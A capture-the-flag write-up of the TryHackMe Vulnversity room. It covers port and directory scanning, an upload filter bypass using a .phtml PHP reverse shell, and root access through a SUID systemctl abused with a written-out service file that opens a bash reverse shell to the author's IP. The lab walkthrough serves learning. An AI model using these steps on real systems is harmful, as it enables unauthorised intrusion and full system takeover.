# Vulnversity Room - CTF

This weekend I completed the Vulnversity room. 
This room was an introductory room that gave some guidance on where to look and stepped through the major points of getting the initial reverse shell operating.

From there, the privilege escalation was left up to me to work out. 

The target was a web server, the exploitation was based on PHP. The web server had a PHP upload portal where I was able to upload a reverse PHP shell, then through this shell escalate my privileges to root using a misconfigured permission on the systemctl program within the server.

Notes: 
 - I have not included the basic setup steps for TryHackMe. 
 - Initially I started using the provided 'AttackBox' from TryHackMe, but part way I ended up using my open Kali linux box connected via the VPN so my IP address and the target IP address changed a few times throughout my process description below.

### Tools
I used the following tools:
- Kali Linux
- Nmap
- Netcat
- GoBuster
- Burp
- Linux shell
- Php reverse shell (see link in the details below)

Here is how it went:

## Step 1: Reconnaissance

### Basic reconnaissance was performed using NMAP. 

The open ports discovered with NMAP:

![image](https://user-images.githubusercontent.com/60744763/120154230-ffc22900-c232-11eb-88a2-8df3177cc8b7.png)

Then I looked at the versions of the services with these open ports using the -sV flag with NMAP

![image](https://user-images.githubusercontent.com/60744763/120154311-18cada00-c233-11eb-9682-38c0e05c6c73.png)

We can see Apache running on port 3333, this will be our attack vector. 

### GoBuster to discover interesting folders on the web server

From here we use GoBuster to look for interesting directories on the web server. I  used a brute force method with different word lists.
After trying with a few word I found some interesting folders.

![image](https://user-images.githubusercontent.com/60744763/120154589-634c5680-c233-11eb-8896-7a0501b2bcee.png)

From here we discovered the 'internal' folder, browsing to this showed us an upload portal.

![image](https://user-images.githubusercontent.com/60744763/120154708-7a8b4400-c233-11eb-8603-b287a43fd81b.png)

*Note at this point I changed over to my Kali linux box and reset the target machine, as such the IP address changed.*

Now I looked for additional interseting folders within the /internal URI using GoBuster again.
This found another folder called *uploads* which looks interesting, likely the directory where the upload portal drops files. 

![image](https://user-images.githubusercontent.com/60744763/120176571-c72e4980-c24a-11eb-8e7f-8e684f0761e2.png)


## Step 2: Attempt to deliver a pay load and compromise the server

I used Burp to try and find out what types of file extensions can be uploaded, hoping for a PHP based file. 
Using Burp's sniper attack allowed me to try various file extensions very quickly. 
 
![image](https://user-images.githubusercontent.com/60744763/120155034-cf2ebf00-c233-11eb-88b3-a73405d0430d.png)

This identified that .phtml files can be uploaded, see above.

### Now we deliver the payload:

I uploaded a php reverse shell as a .phtml file using the target's upload page. The reverse shell trys to make an outgoing shell connection to another machine, in this case, my machine. 
I edited the reverse shell script variables so it points back to my Kali linux???s IP and port. 
The reverse shell was from here: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php 

Then I setup a netcat listener with this command: `nc -lvnp 1234`
This will listen for an incoming connection on port 1234, which our reverse shell script will try to connect to.  

Then I went to the url http://10.10.151.175:3333/internal/uploads/php-reverse-shell.phtml to run the script I just uploaded. 

Moments later I received a connection on my netcat listener!
We can see below the reverse shell has made a connection back to my kali box.

![image](https://user-images.githubusercontent.com/60744763/120155466-33ea1980-c234-11eb-81fe-00558f14202d.png)

### And now I have shell access! 

Searching around on this server, I found the first flag in the user's home folder in a file called 'user.txt'.

![image](https://user-images.githubusercontent.com/60744763/120173380-533e7200-c247-11eb-9091-768cf087f58d.png)

## Step 3: Privilege Escalation

Now we want to attempt to get root access. I will look for files with the SUID bit set, maybe one of them can be exploited.

I used the command `find . -perm /4000` to find files with the SUID permissions set. 
This showed that `systemctl` had the SUID set, which is not normal. Since a normal user can stop, start and even create services.

![image](https://user-images.githubusercontent.com/60744763/120173803-bf20da80-c247-11eb-8a77-87f0e5b9c0e4.png)

At this point my plan is to create a service that launches a shell which I can access with the systemctl command. 
Now researching how to do this... BRB

Ok I'm back! I found this article which discusses making a reverse bash shell service to exploit systemctl.
https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49 


I created a file called root.service as below, which will be my reverse bash shell service:
```
[Unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.4.37.95/9999 0>&1'

[Install]
WantedBy=multi-user.target
```

I named the file with a phtml extension and uploaded it through the site (this was quicker than using the nc terminal to create the service file).

Then I renamed the uploaded file from my active shell on the webserver to root.service. 
I ran the following command to create the appropriate symlinks and allow the system to run the service: 
`systemctl enable /var/www/html/internal/uploads/root.service`

![image](https://user-images.githubusercontent.com/60744763/120178127-7cadcc80-c24c-11eb-9475-61e569611f31.png)

Now we have created a new service which should launch a reverse shell back to my kali box.

At this point I opened another netcat listener on port 9999 (as per the root.service) on my Kali box. 
After this I started the service on the webserver shell with the command `systemctl start root.service`

Presto! The service connected back to my Kali machine with the reverse shell as root. See below...
### I am (g)root!

![image](https://user-images.githubusercontent.com/60744763/120174190-29d21600-c248-11eb-9cf7-bbf5514c3653.png)

The flag was found in the folder /root/



